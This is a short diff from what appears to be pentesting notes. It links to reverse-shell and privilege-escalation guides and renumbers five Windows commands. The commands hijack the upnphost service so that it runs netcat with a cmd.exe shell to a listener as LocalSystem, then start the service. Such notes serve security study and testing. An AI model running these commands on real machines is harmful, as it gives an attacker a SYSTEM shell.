@@ -22,11 +22,11 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
 http://www.fuzzysecurity.com/tutorials/16.html
 
-  sc qc upnphost
-  sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
-  sc config upnphost obj= ".\LocalSystem" password= ""
-  sc qc upnphost
-  net start upnphost
+1. sc qc upnphost
+2. sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+3. sc config upnphost obj= ".\LocalSystem" password= ""
+4. sc qc upnphost
+5. net start upnphost
   
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
  
